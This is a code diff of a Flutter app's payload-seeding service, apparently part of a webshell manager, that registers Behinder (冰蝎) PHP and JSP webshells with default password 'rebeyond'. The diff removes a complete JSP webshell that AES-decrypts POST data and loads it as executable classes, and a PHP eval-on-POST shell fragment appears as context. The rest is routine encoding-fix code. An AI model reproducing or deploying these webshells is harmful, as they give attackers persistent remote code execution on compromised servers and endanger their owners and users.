@@ -1,3 +1,5 @@
+import 'dart:convert';
+
 import 'package:flutter/services.dart';
 
 import '../database/database_helper.dart';
@@ -53,10 +55,10 @@ class SeedService {
       tags: 'php,bypass,base64,rot13,waf',
     ),
     _PayloadDef(
-      asset: 'assets/defaults/payloads/bing.php',
-      name: 'bing.php',
+      asset: 'assets/defaults/payloads/php_behinder.php',
+      name: 'php_behinder.php',
       type: 'php',
-      description: '冰蝎 3.0 原版 PHP，AES 加密，func|params 格式，默认密码 rebeyond',
+      description: 'PHP 冰蝎 3.0（Behinder），AES 加密，func|params 格式，默认密码 rebeyond',
       tags: 'php,behinder,aes,encrypt,冰蝎',
       sinceVersion: 6,
     ),
@@ -79,17 +81,9 @@ class SeedService {
       asset: 'assets/defaults/payloads/jsp_behinder.jsp',
       name: 'jsp_behinder.jsp',
       type: 'jsp',
-      description: '冰蝎 3.0 协议（_bp 缓存参数），AES 加密，默认密码 rebeyond',
+      description: 'JSP 冰蝎 3.0（Behinder），AES 加密，payload 只读 body 第一行，agent 读第二行取参',
       tags: 'jsp,behinder,aes,encrypt,冰蝎',
       sinceVersion: 5,
-    ),
-    _PayloadDef(
-      asset: 'assets/defaults/payloads/bing.jsp',
-      name: 'bing.jsp',
-      type: 'jsp',
-      description: '冰蝎 3.0 原版 JSP，AES 加密，payload 只读 body 第一行，agent 读第二行取参',
-      tags: 'jsp,behinder,aes,encrypt,冰蝎',
-      sinceVersion: 6,
     ),
     // ── ASP ──────────────────────────────────────────────────────────────
     _PayloadDef(
@@ -129,12 +123,6 @@ class SeedService {
           r"$q = $f($_POST['cmd']);" '\n'
           '@eval(\$q);\n'
           '?>\n',
-    ),
-    // jsp_behinder：getReader() 后 getParameter() 为 null，需在读取 body 前缓存参数
-    _PayloadPatch(
-      names: ['jsp_behinder.jsp'],
-      newName: 'jsp_behinder.jsp',
-      content: '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);java.util.Map<String,String> _m=new java.util.HashMap<>();java.util.Enumeration<?> _e=request.getParameterNames();while(_e.hasMoreElements()){String _n=(String)_e.nextElement();_m.put(_n,request.getParameter(_n));}request.setAttribute("_bp",_m);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>',
     ),
   ];
 
@@ -182,9 +170,8 @@ class SeedService {
       // 只种子化本次升级新增的条目
       if (def.sinceVersion <= storedVersion) continue;
       try {
-        final data = await rootBundle.load(def.asset);
-        final bytes = data.buffer.asUint8List();
-        final content = String.fromCharCodes(bytes);
+        // 统一按 UTF‑8 读取内置脚本，避免中文注释乱码
+        final content = await rootBundle.loadString(def.asset);
         await db.createPayload(
           name: def.name,
           type: def.type,
@@ -222,6 +209,8 @@ class SeedService {
   /// 每次启动检查内置 payload 名称/内容是否与预期一致，不一致则原地修复（幂等）
   static Future<void> _applyPatches(DatabaseHelper db) async {
     final existingPayloads = await db.getAllPayloads();
+
+    // 1) 应用显式 Patch（重命名 / 内容修复）
     for (final patch in _patchPayloads) {
       for (final p in existingPayloads) {
         if (!patch.names.contains(p.name)) continue;
@@ -238,6 +227,31 @@ class SeedService {
         } catch (_) {}
         break;
       }
+    }
+
+    // 2) 统一修复所有内置默认 payload 的内容编码
+    //   （早期版本用 String.fromCharCodes 读取 asset，中文注释会乱码）
+    final expectedContentByName = <String, String>{};
+    for (final def in _defaultPayloads) {
+      try {
+        expectedContentByName[def.name] =
+            await rootBundle.loadString(def.asset);
+      } catch (_) {
+        // 忽略缺失的 asset
+      }
+    }
+
+    for (final p in existingPayloads) {
+      final expected = expectedContentByName[p.name];
+      if (expected == null) continue;
+      if (!p.isDefault) continue;
+      if (p.content.trim() == expected.trim()) continue;
+      try {
+        await db.updatePayload(p.copyWith(
+          content: expected,
+          updatedAt: DateTime.now(),
+        ));
+      } catch (_) {}
     }
   }
 }
